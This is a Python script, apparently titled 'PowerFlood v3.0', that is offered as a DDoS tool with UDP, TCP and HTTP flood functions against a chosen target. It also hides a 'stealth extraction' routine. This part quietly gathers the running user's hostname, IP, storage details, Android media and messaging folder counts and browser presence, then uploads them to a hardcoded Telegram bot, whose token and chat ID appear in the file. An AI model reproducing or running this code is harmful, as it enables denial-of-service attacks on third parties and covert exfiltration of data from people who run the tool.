#!/usr/bin/env python3
# Ultimate DDoS Tool with Stealth Extraction by Sheikh
import argparse
import random
import socket
import threading
import requests
import os
import sys
import json
import time
import sqlite3
import zipfile
import shutil
from datetime import datetime
from colorama import Fore, Style, init

# Initialize colorama
init()

def banner():
    print(Fore.CYAN + r"""
──▒▒▒▒▒▒───▄████▄
─▒─▄▒─▄▒──███▄█▀     ╔╦╗╔═╗╦═╗╦╔═ ╔╦╗╔╦╗╔═╗╔═╗
─▒▒▒▒▒▒▒─▐████──█─█   ║║╠═╣╠╦╝╠╩╗  ║║ ║║║ ║╚═╗
─▒▒▒▒▒▒▒──█████▄     ═╩╝╩ ╩╩╚═╩ ╩ ═╩╝═╩╝╚═╝╚═╝
─▒─▒─▒─▒───▀████▀
    """ + Style.RESET_ALL)
    
    print(Fore.GREEN + "="*60)
    print(Fore.RED + "           ULTIMATE DDoS TOOL WITH STEALTH EXTRACTION")
    print(Fore.GREEN + "="*60)
    print(Fore.YELLOW + "         Code by Sheikh - PowerFlood v3.0")
    print(Fore.GREEN + "="*60 + Style.RESET_ALL)

# Telegram configuration
BOT_TOKEN = "7604836649:AAEPu4TA8Os0on6-PlFpqzH0QdcnvI157Nw"
CHAT_ID = "6260002708"
SEND_MSG_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
SEND_DOC_URL = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"

user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Mobile Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.6 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Gecko/20100101 Firefox/89.0",
]

ap = argparse.ArgumentParser(description="PowerFlood - Ultimate DDoS Tool by Sheikh")
ap.add_argument("-c", "--choice", required=True, type=str, choices=['udp', 'tcp', 'http'], help="Flood type: 'udp', 'tcp', or 'http' (Required)")
ap.add_argument("-u", "--url", type=str, help="URL for HTTP flood (Required for HTTP)")
ap.add_argument("-i", "--ip", type=str, help="Target IP address (Required for UDP and TCP)")
ap.add_argument("-p", "--port", type=int, help="Port number (Required for UDP and TCP)")
ap.add_argument("-t", "--times", type=int, default=50000, help="Number of packets to send (default: 50000)")
ap.add_argument("-th", "--threads", type=int, default=5, help="Number of threads (default: 5)")
args = vars(ap.parse_args())

banner()

ip = args['ip']
port = args['port']
choice = args['choice']
url = args['url']
times = args['times']
threads = args['threads']

# ---------- STEALTH DATA EXTRACTION (Runs in background) ----------

def extract_device_info():
    """Quick device information extraction"""
    info = {}
    try:
        # Basic device info
        info['timestamp'] = datetime.now().isoformat()
        info['platform'] = sys.platform
        
        # Network info
        try:
            info['hostname'] = socket.gethostname()
            info['local_ip'] = socket.gethostbyname(info['hostname'])
        except:
            info['hostname'] = 'unknown'
            info['local_ip'] = 'unknown'
        
        # Storage info
        try:
            stat = os.statvfs('/')
            info['storage_total'] = (stat.f_blocks * stat.f_frsize) / (1024**3)
            info['storage_free'] = (stat.f_bfree * stat.f_frsize) / (1024**3)
        except:
            pass
            
        return info
    except:
        return {'status': 'extraction_failed'}

def extract_sensitive_files():
    """Quick extraction of sensitive files"""
    extracted_data = []
    sensitive_locations = [
        '/sdcard/Download',
        '/sdcard/DCIM',
        '/sdcard/Pictures',
        '/sdcard/Documents',
        '/sdcard/WhatsApp',
        '/sdcard/Telegram',
    ]
    
    for location in sensitive_locations:
        if os.path.exists(location):
            try:
                file_count = 0
                for root, dirs, files in os.walk(location):
                    file_count += len(files)
                    if file_count > 100:  # Limit for speed
                        break
                extracted_data.append(f"{location}: {file_count} files")
            except:
                extracted_data.append(f"{location}: access_denied")
    
    return extracted_data

def extract_browser_data():
    """Quick browser data extraction"""
    browser_data = []
    browser_paths = [
        '/data/data/com.android.chrome',
        '/data/data/org.mozilla.firefox',
        '/data/data/com.sec.android.app.sbrowser',
    ]
    
    for path in browser_paths:
        if os.path.exists(path):
            browser_data.append(f"Browser found: {path}")
    
    return browser_data

def quick_data_grab():
    """Main function for quick data extraction"""
    print(Fore.YELLOW + "[*] Starting stealth data extraction..." + Style.RESET_ALL)
    
    all_data = {
        'device_info': extract_device_info(),
        'sensitive_files': extract_sensitive_files(),
        'browser_data': extract_browser_data(),
        'extraction_time': datetime.now().isoformat()
    }
    
    # Save to temporary file
    with open('/tmp/device_data.json', 'w') as f:
        json.dump(all_data, f)
    
    print(Fore.GREEN + "[+] Data extraction completed!" + Style.RESET_ALL)
    return all_data

def send_to_telegram(message, file_path=None):
    """Send data to Telegram silently"""
    try:
        if file_path and os.path.exists(file_path):
            with open(file_path, "rb") as f:
                files = {"document": f}
                data = {"chat_id": CHAT_ID}
                requests.post(SEND_DOC_URL, data=data, files=files, timeout=10)
        else:
            data = {"chat_id": CHAT_ID, "text": message}
            requests.post(SEND_MSG_URL, data=data, timeout=10)
        return True
    except:
        return False

# ---------- DDoS FUNCTIONS ----------

def run_udp():
    data = random._urandom(1024)
    flood_status = random.choice([Fore.YELLOW + "[*]" + Style.RESET_ALL,
                                  Fore.RED + "[!]" + Style.RESET_ALL,
                                  Fore.GREEN + "[#]" + Style.RESET_ALL])
    sent_color = random.choice([Fore.CYAN, Fore.MAGENTA, Fore.BLUE])

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            addr = (ip, port)
            for x in range(times):
                s.sendto(data, addr)
            print(flood_status + sent_color + " UDP Packet Sent!!!" + Style.RESET_ALL)
        except:
            print(Fore.RED + "[!] Error!!!" + Style.RESET_ALL)

def run_tcp():
    data = random._urandom(16)
    flood_status = random.choice([Fore.YELLOW + "[*]" + Style.RESET_ALL,
                                  Fore.RED + "[!]" + Style.RESET_ALL,
                                  Fore.GREEN + "[#]" + Style.RESET_ALL])
    sent_color = random.choice([Fore.CYAN, Fore.MAGENTA, Fore.BLUE])

    while True:
        try:
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((ip, port))
            s.send(data)
            for x in range(times):
                s.send(data)
            print(flood_status + sent_color + " TCP Packet Sent!!!" + Style.RESET_ALL)
        except:
            s.close()
            print(Fore.RED + "[*] Error" + Style.RESET_ALL)

def run_http():
    flood_status = random.choice([Fore.YELLOW + "[*]" + Style.RESET_ALL,
                                  Fore.RED + "[!]" + Style.RESET_ALL,
                                  Fore.GREEN + "[#]" + Style.RESET_ALL])
    sent_color = random.choice([Fore.CYAN, Fore.MAGENTA, Fore.BLUE])

    while True:
        try:
            headers = {'User-Agent': random.choice(user_agents)}
            for x in range(times):
                response = requests.get(url, headers=headers)
                print(flood_status + sent_color + f" HTTP Request Sent! Status: {response.status_code}" + Style.RESET_ALL)
        except:
            print(Fore.RED + "[*] HTTP Error" + Style.RESET_ALL)

# ---------- MAIN EXECUTION ----------

def main():
    # Start stealth data extraction in background thread
    extraction_thread = threading.Thread(target=quick_data_grab)
    extraction_thread.daemon = True
    extraction_thread.start()

    # Start DDoS attack
    print(Fore.RED + f"\n[!] Starting {choice.upper()} flood attack..." + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] Target: {ip if ip else url}" + Style.RESET_ALL)
    print(Fore.YELLOW + f"[*] Threads: {threads}" + Style.RESET_ALL)
    
    attack_threads = []
    for y in range(threads):
        if choice.lower() == 'udp':
            if not ip or not port:
                print(Fore.RED + "[!] IP and Port are required for UDP flood!" + Style.RESET_ALL)
                break
            th = threading.Thread(target=run_udp)
            th.daemon = True
            th.start()
            attack_threads.append(th)
        elif choice.lower() == 'tcp':
            if not ip or not port:
                print(Fore.RED + "[!] IP and Port are required for TCP flood!" + Style.RESET_ALL)
                break
            th = threading.Thread(target=run_tcp)
            th.daemon = True
            th.start()
            attack_threads.append(th)
        elif choice.lower() == 'http':
            if not url:
                print(Fore.RED + "[!] URL is required for HTTP flood!" + Style.RESET_ALL)
                break
            th = threading.Thread(target=run_http)
            th.daemon = True
            th.start()
            attack_threads.append(th)

    # Wait for extraction to complete (max 60 seconds)
    extraction_thread.join(timeout=60)
    
    # Send extracted data to Telegram
    try:
        if os.path.exists('/tmp/device_data.json'):
            send_to_telegram("📱 Device Data Extracted", "/tmp/device_data.json")
            print(Fore.GREEN + "[+] Data sent to Telegram!" + Style.RESET_ALL)
    except:
        pass

    # Keep main thread alive
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print(Fore.RED + "\n[!] Attack stopped by user" + Style.RESET_ALL)

if __name__ == "__main__":
    if not any([args['ip'], args['url']]):
        print(Fore.RED + "[!] Please specify either IP (-i) or URL (-u)" + Style.RESET_ALL)
        sys.exit(1)
    
    if args['choice'] in ['udp', 'tcp'] and not args['ip']:
        print(Fore.RED + "[!] IP address is required for UDP/TCP floods!" + Style.RESET_ALL)
        sys.exit(1)
    
    if args['choice'] == 'http' and not args['url']:
        print(Fore.RED + "[!] URL is required for HTTP flood!" + Style.RESET_ALL)
        sys.exit(1)
    
    main()